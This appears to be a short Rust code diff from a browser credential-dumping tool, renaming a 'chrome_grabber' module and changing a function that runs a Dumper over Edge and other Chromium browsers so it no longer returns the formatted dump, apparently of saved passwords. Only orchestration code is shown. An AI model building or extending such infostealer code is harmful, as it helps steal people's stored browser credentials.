@@ -1,14 +1,14 @@
 
 
-use crate::chrome_grabber::dumper::Dumper;
+use crate::chromium::dumper::Dumper;
 use std::collections::HashMap;
-use crate::chrome_grabber::dumper::DumperError;
+use crate::chromium::dumper::DumperError;
 pub type DumperResult<T> = Result<T, DumperError>;
 
 
 
 
-pub fn chrome_main() -> String {
+pub fn chrome_main() {
 
         let mut hm = HashMap::new();
         hm.insert("edge", Dumper::new("Edge", "Microsoft"));
@@ -47,7 +47,7 @@ pub fn chrome_main() -> String {
     let opt_browsers = browsers.keys().map(|v| v.to_string()).collect::<Vec<_>>();
     
 
-    let data = opt_browsers
+    let _ = opt_browsers
         .into_iter()
         .filter_map(|v| browsers.get(v.as_str()).cloned())
         .map(|mut v| v.dump().map(|_| v))
@@ -56,8 +56,6 @@ pub fn chrome_main() -> String {
 
 
     
-    let pws = format!("{:#?}", data);
     
     
-    pws
 }
